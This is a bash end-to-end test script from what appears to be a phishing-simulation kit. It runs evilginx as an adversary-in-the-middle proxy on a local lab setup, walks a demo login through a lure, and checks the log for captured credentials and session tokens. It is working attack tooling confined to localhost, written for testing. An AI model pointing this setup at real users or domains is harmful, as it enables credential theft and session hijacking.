#!/usr/bin/env bash
# =============================================================================
# Full AiTM demo end to end THROUGH evilginx (needs root / setcap).
#
# Unlike tests/smoke/demo_cookie_e2e.sh (which runs unprivileged and exercises the
# capture *surface*), this drives the whole proxy loop:
#
#     victim  --HTTPS-->  demo-cookie.local.phishkit  (evilginx lure, :443)
#     evilginx --HTTPS-->  app.cookie-demo.test        (upstream app, :443 on 127.0.0.2)
#
# and asserts evilginx captured a session. Privileged because evilginx binds :443/:53
# and the upstream binds 127.0.0.2:443. Run on a disposable lab box:
#
#     sudo bash tests/smoke/aitm_e2e_sudo.sh
#
# What it does (and undoes on exit):
#   * builds evilginx if needed and grants it cap_net_bind_service
#   * adds /etc/hosts entries for the lure and upstream hosts
#   * starts the cookie app as an HTTPS upstream on 127.0.0.2:443
#   * starts the lure via kit/evilginx/scripts/configure_lure.py
#   * walks the login through the lure and checks for a captured session
# =============================================================================
set -euo pipefail

REPO="$(cd "$(dirname "$0")/../.." && pwd)"
cd "$REPO"

LURE_HOST="demo-cookie.local.phishkit"
UPSTREAM_HOST="app.cookie-demo.test"
UPSTREAM_IP="127.0.0.2"
CREDS_USER="demo@phishkit.local"
CREDS_PASS="demo-password"
CERT_DIR="$(mktemp -d)"
HOSTS_MARK="# phishkit-aitm-e2e"
PIDS=()

log()  { printf '\033[1;36m==>\033[0m %s\n' "$*"; }
fail() { printf '\033[1;31mFAIL:\033[0m %s\n' "$*" >&2; exit 1; }
pass() { printf '   \033[1;32mok\033[0m - %s\n' "$*"; }

[[ "$(id -u)" -eq 0 ]] || fail "run as root (sudo) — evilginx and the upstream bind :443"

cleanup() {
  log "teardown"
  bash kit/evilginx/scripts/stop_evilginx.sh >/dev/null 2>&1 || true
  for pid in "${PIDS[@]:-}"; do kill "$pid" 2>/dev/null || true; done
  sed -i "/$HOSTS_MARK/d" /etc/hosts 2>/dev/null || true
  rm -rf "$CERT_DIR"
}
trap cleanup EXIT

log "build evilginx if missing"
[[ -x kit/evilginx/run/evilginx ]] || make build-evilginx
command -v setcap >/dev/null && setcap cap_net_bind_service=+ep kit/evilginx/run/evilginx || true
pass "evilginx present"

log "ensure python venv with pexpect + screen"
command -v screen >/dev/null || fail "'screen' not installed (apt-get install screen / brew install screen)"
if [[ ! -x venv/bin/python ]]; then python3 -m venv venv; fi
./venv/bin/python -m pip install -q -r scripts/requirements.txt
pass "runtime deps ready"

log "/etc/hosts entries"
grep -q "$LURE_HOST" /etc/hosts || echo "127.0.0.1 $LURE_HOST $HOSTS_MARK" >> /etc/hosts
grep -q "$UPSTREAM_HOST" /etc/hosts || echo "$UPSTREAM_IP $UPSTREAM_HOST $HOSTS_MARK" >> /etc/hosts
pass "hosts mapped ($LURE_HOST -> 127.0.0.1, $UPSTREAM_HOST -> $UPSTREAM_IP)"

log "self-signed cert + HTTPS upstream on $UPSTREAM_IP:443"
scripts/gen_demo_tls_cert.sh "$CERT_DIR" "$UPSTREAM_HOST" >/dev/null
( cd demos && npm install --silent >/dev/null 2>&1 \
  && HOST="$UPSTREAM_IP" PORT=443 \
     TLS_CERT="$CERT_DIR/$UPSTREAM_HOST.crt" TLS_KEY="$CERT_DIR/$UPSTREAM_HOST.key" \
     npx tsx cookie/server.ts >/tmp/pk-upstream.log 2>&1 ) &
PIDS+=($!)
for i in $(seq 1 50); do curl -sk -o /dev/null "https://$UPSTREAM_IP:443/healthz" && break; sleep 0.2; done
curl -sk -o /dev/null "https://$UPSTREAM_IP:443/healthz" || fail "upstream did not start"
pass "upstream up"

log "start the lure via configure_lure.py"
export PHISHKIT_ROOT="$REPO"
export EVILGINX_DATA_DIR="$REPO/kit/evilginx/run/data"
export EVILGINX_LOG="$EVILGINX_DATA_DIR/evilginx.log"
lure=$(./venv/bin/python kit/evilginx/scripts/configure_lure.py \
  --phishlet demo-cookie --dryrun-domain "$LURE_HOST" --regenerate-path)
[[ -n "$lure" ]] || fail "no lure URL returned"
pass "lure: $lure"

log "walk the login through the lure"
JAR="$CERT_DIR/jar.txt"
login_url=$(curl -sk -o /dev/null -w '%{redirect_url}' "$lure")
login_url="${login_url:-https://$LURE_HOST/login}"
curl -sk -c "$JAR" -o /dev/null "https://$LURE_HOST/login"
curl -sk -b "$JAR" -c "$JAR" -o /dev/null -X POST \
  --data "username=$CREDS_USER&password=$CREDS_PASS" "https://$LURE_HOST/login"
sleep 1

log "check evilginx captured a session"
if grep -qiE "all authorization tokens intercepted|new visitor has arrived|username:|password:" "$EVILGINX_LOG"; then
  pass "evilginx recorded credential/session activity"
else
  echo "---- evilginx.log tail ----"; tail -30 "$EVILGINX_LOG" || true
  fail "no capture recorded — inspect $EVILGINX_LOG"
fi

echo
echo "PASS: AiTM demo captured a session end to end through evilginx."
